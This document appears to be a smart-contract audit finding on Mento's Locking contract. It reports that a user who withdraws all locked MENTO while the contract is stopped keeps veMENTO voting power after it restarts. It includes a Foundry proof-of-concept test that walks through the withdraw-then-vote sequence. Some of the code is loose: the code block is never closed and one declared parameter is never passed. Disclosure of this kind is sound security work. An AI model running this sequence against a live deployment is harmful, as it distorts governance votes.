# `Locking::withdraw` & `Locking::getAvailableForWithdraw` , Users can withdraw their entire locked MENTO token and still retain veMENTO tokens, which they can use to cast votes.

## Summary 
When the owner sets the contract state to "stop" a user withdraws their entire locked MENTO token balance. Shortly after, the owner resumes to the "start" state. Now Despite the contract resuming normal operations, the user's veMENTO balance continues to decrease linearly, allowing them to retain voting rights even after withdrawing their MENTO tokens.

## Vulnerability Detail
During a contract stoppage, users can withdraw their entire MENTO token balance, yet retain veMENTO voting rights, as the contract resumes operation, resulting in potential misrepresentation of voting power.

### POC 
Add this test function in `GovernanceIntegration.t.sol`

```soldity
      function test_POC() public {
        vm.prank(governanceTimelockAddress);
        mentoToken.transfer(alice, 10_000e18);

        vm.prank(governanceTimelockAddress);
        mentoToken.transfer(bob, 10_000e18);

        vm.prank(alice);
        locking.lock(alice, alice, 10_000e18, 1, 103);

        vm.prank(bob);
        locking.lock(bob, bob, 1500e18, 1, 103);

        vm.timeTravel(BLOCKS_DAY);

        uint256 newVotingDelay = BLOCKS_DAY;
        uint256 newVotingPeriod = 2 * BLOCKS_WEEK;
        uint256 newThreshold = 5000e18;
        uint256 newQuorum = 10; //10%
        uint256 newMinDelay = 3 days;
        uint32 newMinCliff = 6;
        uint32 newMinSlope = 12;

        vm.prank(alice);
        (
            uint256 proposalId,
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory calldatas,
            string memory description
        ) = Proposals._proposeChangeSettings(
            mentoGovernor,
            governanceTimelock,
            locking,
            newVotingDelay,
            newVotingPeriod,
            newThreshold,

            newMinDelay,
            newMinCliff,
            newMinSlope
        );

        // ~10 mins
        vm.timeTravel(120);

        // both users cast vote, but majority in favour of alice because alice has more votes than bob

        vm.startPrank(governanceTimelockAddress);
        locking.stop();
        vm.stopPrank();

        uint256 bal2 = mentoToken.balanceOf(alice);
        console.log(bal2); // 0 because alice has locked her all token

        vm.startPrank(alice);
        locking.withdraw();
        vm.stopPrank();

        vm.startPrank(governanceTimelockAddress);
        locking.start();
        vm.stopPrank();

        uint256 bal = mentoToken.balanceOf(alice);
        console.log(bal);  // 10000000000000000000000 because now she has withrawn her all token
        vm.prank(alice);

        console.log(mentoGovernor.castVote(proposalId, 1)); // 10000000000000000000000 (still able to cast vote)
    }

## Tool used

Manual Review, VSCode

## Recommendation
Implentation of those functions must be corrected to avoid this kind of Vulnerability.
